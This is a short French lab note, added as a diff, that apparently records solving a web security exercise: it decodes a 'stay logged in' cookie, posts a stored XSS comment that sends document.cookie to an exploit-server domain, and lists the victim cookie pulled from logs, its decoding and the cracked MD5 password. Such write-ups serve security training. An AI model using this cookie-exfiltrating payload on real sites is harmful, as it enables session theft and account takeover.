@@ -1,0 +1,17 @@
+# Connexion au lab via wiener:peter
+
+Cookie : d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+decode : wiener:51dc30ddc473d43a6011e9ebba6ca770
+
+Sous un post en comment,
+<script>const cookie=document.cookie; alert(cookie); </script>
+
+Déclenche une alerte qui affiche le cookie
+
+Utilisation du serveur d'exploit
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+
+
+Cookie récupéré dans les logs : Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+Décodage : carlos:26323c16d5f4dabff3bb136f2460a943
+md5 : onceuponatime
